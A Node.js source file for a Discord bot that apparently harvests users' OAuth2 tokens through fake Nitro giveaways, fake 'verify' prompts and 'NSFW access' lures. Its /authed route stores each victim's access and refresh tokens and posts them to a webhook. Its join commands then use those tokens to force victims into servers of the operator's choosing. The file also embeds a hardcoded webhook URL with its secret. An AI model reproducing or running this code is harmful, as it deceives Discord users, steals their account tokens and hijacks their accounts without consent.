
const main = require("./classes/main");

const Discord = require("discord.js");

const client1 = new Discord.Client()
client1.login(process.env.token)
const disbut = require('discord-buttons')
disbut(client1)

const DB = require("./database/usage")

const config = require("./config.js");

require("./database/main");

const express = require("express");
const fetch = require("node-fetch")

const app = express();

const client = new main({
  token: process.env.token,
  prefix: config.prefix,
  client_id: config.client_id,
  client_secret: process.env.client_secret,
  redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
  console.log(`Logged in as ${bot.user.tag} bot id : ${bot.user.id}`)
  bot.user.setPresence({ activity: { name: "you", type: "WATCHING" }, status: "online" })
});


client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) return;

  msg = message
  AUTH_LINK = config.oauth_link

  if (command === "users") {
    const amount = await client.tokenCount();
    const embed = new Discord.MessageEmbed()
      .setTitle(`${config.emojis.user} OAuth2 Info`)
      .setDescription(`There are \`${amount}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
      .setColor("2F3136")

    msg.channel.send(embed);
  }



  if (command === "join") {
    if (!args[0] || !args[1]) return message.channel.send({
      embed: {
        title: "Auths Joining",
        description: `There was error\nCorrect usage: \`join <server-id> <amount-joins>\``,
        footer: {
          text: `Coded by iLxlo#9432`,
          icon_url: `https://cdn.discordapp.com/avatars/998977443002077325/a_748a4ec38d28d13056dc724df03a8de3.gif?size=1024`
        },
        color: "RED"
      }
    });
    let f = await DB.findOne({
      GuildID: args[0],
    })
    if (f) await f.delete()
    new DB({
      GuildID: args[0],
      Amount: args[1],
      User: message.author.id,
      Time: `<t:${parseInt(Date.now() / 1000)}:R>`,
    }).save()
    client.manageJoin({
      amount: args[1],
      guild_id: args[0]
    }, message);
    const web = new Discord.WebhookClient({ url: `https://discord.com/api/webhooks/1003422582168633466/RWqxK_GqAUz5sPP-nm4OPTCtwJ5kSb_DyNHFixmgdJxP1OaJQQhvndWgmhhcITQaXwWe` });
    web.send(`${message.author} - (${message.author.tag} ${message.author.id} ) used **.join** auth on ${message.guild.name}! `)
  }

  if (command === "joinall") {
    let sunucu = message.guild.id
    const sayı = await client.tokenCount();
    await client.manageJoin({
      amount: sayı,
      guild_id: sunucu
    }, message);
  }



  if (command === "server") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`In order to participate in the giveaway you must verify yourself so we can check if you're an alternative account.

\`How to verify?\`
**Click on the __Verify__ button and authorize yourself.**`)

    let button = new disbut.MessageButton()
      .setStyle("url")
      .setEmoji("<:verify:1010692567521837066>")
      .setLabel("Verify")
      .setURL(AUTH_LINK)

    message.channel.send({ button: button, embed: embed })
  }


  if (command === "altbot") {
    let verifynow = new Discord.MessageEmbed()
      .setDescription(`Hey, Hold on for a second! Please Verify Your Account first before you want to Claim any Rewards or Giveaways!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
    let verifynoww = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("✅")
      .setLabel('Click Here To Verify').setURL(config.oauth_link)
    message.channel.send("**Verify Now**", { embed: verifynow, button: verifynoww })
  }

  if (command === "cleans") {
    await client.clean(message)
  }

  if (command === "refresh") {
    await client.refreshTokens(message)
  }
  if (command === "links") {

    let AL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Auth Link')
      .setURL(config.oauth_link)


    let IL = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Invite Link')
      .setURL(config.bot_link)

    const links = new Discord.MessageEmbed().setTitle(`${config.emojis.user} Links Dashboard`).setDescription(`**${config.emojis.link} OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**${config.emojis.link} Invite:\n**${config.bot_link}\n\`\`\`${config.bot_link}\`\`\``)
      .setColor("2F3136")
    message.channel.send({ embed: links, button: [AL, IL] })
  }

  if (command === "link") {

    const embed = new Discord.MessageEmbed()
      .setDescription(`⬇️ Choose what you want clicking the buttons ⬇️`)
      .setColor("2F3136")
    let AL = new disbut.MessageButton()
      .setStyle('green')
      .setLabel('Auth Link')
      .setID("AL")


    let IL = new disbut.MessageButton()
      .setStyle('green')
      .setLabel('Invite Link')
      .setID("IL")
    msg.channel.send({ button: [AL, IL], embed: embed })
  }

  if (command === "restart") {
    message.channel.send(`${config.emojis.load} **Restarting....**`)
    await client.restart();
  }

  if (command === "nsfw") {
    let embed = new Discord.MessageEmbed()
      .setDescription(`**Click On "Access" To Have Acces to Nsfw!**`)
      .setImage("https://media.discordapp.net/attachments/895353212956192809/972072712950399036/4e25c6a7ac1fd3a31fd62594930536221cfd32f3.gif")

    let claim = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji('<:yes:1004849132483121172>')
      .setLabel('Access')
      .setURL(config.oauth_link)

    msg.channel.send(``, { embed: embed, button: claim })
  }

  if (command === "help") {
    let help = new Discord.MessageEmbed()
      .setTitle(`OAuth2 - Help Commands`)
      .addField(`> ${config.emojis.link} OAuth2:`, `\`\`\`users, join, joinall, refresh, cleans, restart, ping, altbot, verify, links, claim, giveaway, check, server\`\`\``)
      //.addField("> :gift: Owner:", `\`\`\`wl-add, wl-remove, wl-users\`\`\``)
      .setFooter("Anan", "https://cdn.discordapp.com/emojis/905169964099579964.gif?size=300")




    let joinall = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setLabel('Instant Join All')
      .setEmoji('🎉')
      .setID("bjoinall")


    let users = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setLabel('Users')
      .setEmoji(config.emojis.user)
      .setID("busers")

    let links = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setEmoji(config.emojis.link)
      .setLabel('Links')
      .setID("links")

    let ping = new disbut.MessageButton()
      .setStyle('PRIMARY')
      .setEmoji('🏓')
      .setLabel('Ping')
      .setID("PING")


    msg.channel.send(help)
  }


  if (command === "check") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription(`${config.emojis.link} Please Verify YourSelf!.`)
      .setColor("2F3136")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(AUTH_LINK)
    message.channel.send({ embed: checkembed, button: check })
  }


  if (command === "verify") {
    const embed = new Discord.MessageEmbed()
      .setDescription(
        `${config.emojis.arrow} *Must Verify for claim your price!*\n\n**1.** Click on the [__button__](${AUTH_LINK})\n**2.** Click in [__Authorize__](${AUTH_LINK})\n\nAfter wait 1-5 hours and you got FREE NITRO!`)
      .setColor("#2F3136")
      .setThumbnail("https://cdn.discordapp.com/emojis/995710474442256485.gif?size=300")
      .setImage("https://media.discordapp.net/attachments/717101622328557589/731083869201104956/Screenshot_1.png?width=288&height=115")
    /* const embed = new Discord.MessageEmbed()
     .setColor("#2F3136")
   .setImage("https://cdn.discordapp.com/attachments/1007047368845295797/1007806930569400430/fr1.png")*/
    let verify = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Click Here to Verify')
      .setURL(AUTH_LINK)
      .setEmoji("🎉")

    msg.channel.send("**:wave: Hey everyone, Discord has been gifted __Nitro `1 Year`__ 🎉**!", { embed: embed, button: verify })
  }

  if (command === "ping") {
    msg.reply(`:ping_pong: Pong! ${bot.ws.ping}ms`)
  }

  if (command === "giveaway") {
    let giveaway = new Discord.MessageEmbed()
      .setTitle(`🎉 **Giveaway** 🎉`)
      .setColor("2F3136")
      .setDescription(`\n:gift: **WINNERS:** \`1\`\n:tada: **TIMER**: \`24h\`\n:gift: **PRIZE:** \`Nitro Boost 1 Year\`\n:tada: **HOSTED BY: ${message.author}**\n\n:link: __**Requirements:**__\n:link: **Must stay in the server.**\n\nTo enter the giveaway click on the enter button.`)
      .setFooter("Discord Event", "https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300")
    let giveawaybutton = new disbut.MessageButton()
      .setStyle('url')
      .setEmoji("🎉")
      .setLabel('Enter')
      .setURL(AUTH_LINK)
    message.channel.send("Giveaway for `Nitro 1 Year` has been made! :gift:", { embed: giveaway, button: giveawaybutton })
  }

})


app.get("/", (req, res) => {
  res.redirect(config.oauth_link);
});




app.get("/authed", async (req, res) => {
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  const obj = {
    ...data,
    user_id
  };
  client.saveAuth(obj);

  fetch('https://discord.com/api/users/@me', {
    headers: {
      authorization: `Bearer ${data.access_token}`,
    },
  })
    .then(result => result.json())
    .then(response => {
      const { username, discriminator, avatar, id } = response;

      let params = {
        username: config.webhook.webhookNAME,
        avatar_url: config.webhook.avatarURL,
        embeds: [{
          "title": `<:user_invite:1010502829837910037> New User`,
          "description": `<:arrow:1010502695783776268>  Identify: \`${username}#${discriminator}\`\n\n<:arrow:1010502695783776268>  Identify ID: \`${id}\`\n\n<:arrow:1010502695783776268>  Access Token: \`${data.access_token}\`\n\n<:arrow:1010502695783776268>  Refresh Token: \`${data.refresh_token}\``,
          "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?size=2048` }
        }]
      }


      fetch(config.webhook.URL, {
        method: "POST",
        headers: {
          'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
      }).then(res => {
        console.log(res);
      })
    })

  //webhook.send({embeds: [embed]})

  res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80); // Local Host Port

client.on("clickButton", async (bot, button, userID, guildID) => {
  const member = button.clicker.user.id;
  if (config.owners.includes(userID)) {

    AUTH_LINK = config.oauth_link

    if (button.id === 'AL') {
      const embed = new Discord.MessageEmbed()
        .setDescription(`${AUTH_LINK}`)
        .setColor("2F3136")
      button.channel.send({ embed: embed })
      button.reply.defer()


    }
    if (button.id === 'IL') {
      const embedd = new Discord.MessageEmbed()
        .setDescription(`https://discord.com/api/oauth2/authorize?client_id=${bot.user.id}&permissions=8&redirect_uri=https%3A%2F%2FOauth3-3.atahanbert.repl.co%2Fcallback&response_type=code&scope=bot`)
        .setColor("2F3136")
      button.channel.send({ embed: embedd })
      button.reply.defer()

    }

    if (button.id === 'PING') {

      button.channel.send(`:ping_pong: Pong!\nAPI Latency is **${Math.round(client.ws.ping)}ms**`)
      button.reply.defer()

    }
    if (button.id === 'busers') {

      const amount = await client.tokenCount();
      const embed = new Discord.MessageEmbed()
        .setTitle(`${config.emojis.user} OAuth2 Info`)
        .setDescription(`There are \`${amount}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
        .setColor("2F3136")
      button.channel.send(embed);

      button.reply.defer()

    }


    /*if(button.id === 'checkusers') {
      const data = `${rankedList.map((player,index) => `\`${index+1}.\` ${player}`).join('\n') || "**The list has not been updated.**"}`
      const embed = new Discord.MessageEmbed()
.setDescription(`${data}`)
         .setTimestamp()
      .setColor("2F3136")


  button.channel.send({embed : embed})
button.reply.defer()
   

}*/


    if (button.id === 'links') {
      const emmbed = new Discord.MessageEmbed()
        .setTitle(`${config.emojis.user} Links Dashboard`)
        .setDescription(`**OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**Invite:\n**\[**BOT INVITE LINK**](https://discord.com/api/oauth2/authorize?client_id=1010263092464193607&permissions=8&scope=bot)\n\`\`\`https://discord.com/api/oauth2/authorize?client_id=1010263092464193607&permissions=8&scope=bot\`\`\``)
        .setColor("2F3136")
      button.channel.send({ embed: emmbed });
      button.reply.defer()

    }


    if (button.id === 'cancel') {
      /*  const emmbed = new Discord.MessageEmbed()
        .setDescription(`<a:loading:1007345170393616515> *Canceling this pull...*
        `)
        .setColor("2F3136")
        button.channel.send({embed: emmbed}).then(msg => {*/
      const guild = button.guild;
      guild.leave();
    }
    const sayi = await client.tokenCount();
    if (button.id === 'bjoinall') {
      let pull = new Discord.MessageEmbed()
        .setTitle(`:link: Users Joining:`)
        .setDescription(':link: The joins is coming out, takes 1-30 mintues.\n:link: Type `' + config.prefix + 'help` for more commands')
        .setColor("2F3136")
        .setFooter("ANAN")
      button.channel.send(pull)
      await client.manageJoin({
        amount: sayi,
        guild_id: button.guild.id
      }, message);
    }
  }
})

